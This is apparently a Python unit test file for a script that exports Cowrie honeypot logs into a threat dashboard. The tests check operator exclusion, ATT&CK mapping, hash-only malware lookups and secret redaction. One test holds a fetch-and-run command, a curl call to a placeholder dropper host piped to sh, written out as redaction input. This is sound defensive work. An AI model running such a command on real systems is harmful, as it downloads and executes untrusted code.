import importlib.util
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "export-dashboard.py"
FIXTURE = ROOT / "tests" / "fixtures" / "cowrie.json"

spec = importlib.util.spec_from_file_location("export_dashboard", SCRIPT)
export_dashboard = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(export_dashboard)


class DashboardExportTests(unittest.TestCase):
    def make_snapshot(self, cache_path=None, **kwargs):
        events, invalid = export_dashboard.load_events(FIXTURE)
        return export_dashboard.build_snapshot(
            events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
            "operational", cache_path, 0, public_endpoint="sensor.example.invalid", **kwargs,
        )

    def test_real_attacker_evidence_is_published_after_operator_exclusion(self):
        snapshot = self.make_snapshot()
        self.assertEqual(snapshot["schema_version"], "3.0")
        self.assertEqual(snapshot["summary"]["sessions"], 2)
        self.assertEqual(snapshot["summary"]["unique_sources"], 2)
        self.assertEqual(snapshot["summary"]["auth_attempts"], 3)
        self.assertEqual(snapshot["summary"]["downloads"], 1)
        self.assertEqual(snapshot["data_quality"]["invalid_lines"], 1)
        self.assertEqual(snapshot["data_quality"]["operator_events_excluded"], 1)

        rendered = json.dumps(snapshot)
        self.assertIn("8.8.8.8", rendered)
        self.assertIn("1.1.1.1", rendered)
        self.assertIn("123456", rendered)
        self.assertIn("uname -a", rendered)
        self.assertIn("a6296a79f44e21b76604d2d2bbf795d2cf380f70e39d45fbf166707ff3b4a6a4", rendered)
        self.assertNotIn("9.9.9.9", rendered)
        self.assertNotIn("admin@example.com", rendered)
        self.assertNotIn("eyJaaaaaaaaaaaa", rendered)
        self.assertNotIn("token=secret", rendered)
        self.assertNotIn("fixture-one", rendered)
        self.assertNotIn("T1078", rendered)
        artifact = snapshot["artifacts"][0]
        self.assertEqual(artifact["classification"]["status"], "unavailable")
        self.assertEqual(artifact["techniques"], ["T1105"])
        command = next(item for item in snapshot["commands"] if item["command"].startswith("curl"))
        self.assertEqual(command["techniques"], ["T1105", "T1059.004"])
        self.assertEqual(snapshot["sensor"]["public_endpoint"]["services"], [
            {"protocol": "SSH", "port": 22}, {"protocol": "TELNET", "port": 23},
        ])

    def test_geo_cache_enriches_sources_without_network_lookup(self):
        with tempfile.TemporaryDirectory() as directory:
            cache = Path(directory) / "geo.json"
            cache.write_text(json.dumps({"8.8.8.8": {
                "country": "United States", "country_code": "US", "city": "San Jose",
                "latitude": 37.3382, "longitude": -121.8863, "asn": 15169,
                "organization": "Example Network", "flag": "🇺🇸"
            }}), encoding="utf-8")
            snapshot = self.make_snapshot(cache)
            source = next(item for item in snapshot["sources"] if item["ip"] == "8.8.8.8")
            self.assertEqual(source["country_code"], "US")
            self.assertEqual(source["asn"], 15169)

    def test_navigator_layer_contains_observed_evidence(self):
        snapshot = self.make_snapshot()
        layer = export_dashboard.navigator_layer(snapshot)
        self.assertEqual(layer["domain"], "enterprise-attack")
        self.assertTrue(layer["techniques"])
        self.assertTrue(any(item["comment"] for item in layer["techniques"]))

    def test_single_credential_attempt_does_not_imply_password_guessing(self):
        events, _ = export_dashboard.load_events(FIXTURE)
        single_attempt = [
            event for event in events
            if event.get("src_ip") == "1.1.1.1" and event.get("eventid") == "cowrie.login.failed"
        ]
        snapshot = export_dashboard.build_snapshot(
            single_attempt, 0, set(), "greyfield-test", "test-region-1",
        )
        self.assertNotIn("T1110.001", {item["id"] for item in snapshot["mitre"]})

    def test_family_lookup_is_hash_only_and_cached_after_first_query(self):
        with tempfile.TemporaryDirectory() as directory:
            cache = Path(directory) / "family-cache.json"
            auth_key = Path(directory) / "auth-key"
            auth_key.write_text("fixture-auth-key\n", encoding="utf-8")
            result = {
                "status": "known", "label": "FixtureFamily", "basis": "third-party",
                "provider": "MalwareBazaar", "retrieved_at": "2026-09-01T12:30:00Z",
            }
            with mock.patch.object(export_dashboard, "lookup_malwarebazaar", return_value=result) as lookup:
                first = self.make_snapshot(
                    family_cache_path=cache, family_provider="malwarebazaar",
                    family_auth_key_path=auth_key, family_limit=20,
                )
                second = self.make_snapshot(
                    family_cache_path=cache, family_provider="malwarebazaar",
                    family_auth_key_path=auth_key, family_limit=20,
                )
            lookup.assert_called_once_with(
                "a6296a79f44e21b76604d2d2bbf795d2cf380f70e39d45fbf166707ff3b4a6a4",
                "fixture-auth-key",
            )
            self.assertEqual(first["artifacts"][0]["classification"], result)
            self.assertEqual(second["artifacts"][0]["classification"], result)
            cached = json.loads(cache.read_text(encoding="utf-8"))
            self.assertEqual(list(cached["entries"]), [first["artifacts"][0]["sha256"]])

    def test_invalid_hash_is_not_queried_or_published_as_sha256(self):
        events, invalid = export_dashboard.load_events(FIXTURE)
        download = next(event for event in events if event.get("eventid") == "cowrie.session.file_download")
        download["shasum"] = "not-a-sha256"
        with mock.patch.object(export_dashboard, "lookup_malwarebazaar") as lookup:
            snapshot = export_dashboard.build_snapshot(
                events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
                family_provider="malwarebazaar",
            )
        lookup.assert_not_called()
        self.assertIsNone(snapshot["artifacts"][0]["sha256"])
        self.assertEqual(snapshot["artifacts"][0]["classification"]["status"], "unavailable")

    def test_embedded_url_credentials_and_query_are_removed(self):
        cleaned, redactions = export_dashboard.clean_evidence(
            "curl https://operator:secret@payload.example.invalid/dropper?token=value | sh"
        )
        self.assertEqual(cleaned, "curl https://payload.example.invalid/dropper | sh")
        self.assertGreaterEqual(redactions, 1)


if __name__ == "__main__":
    unittest.main()
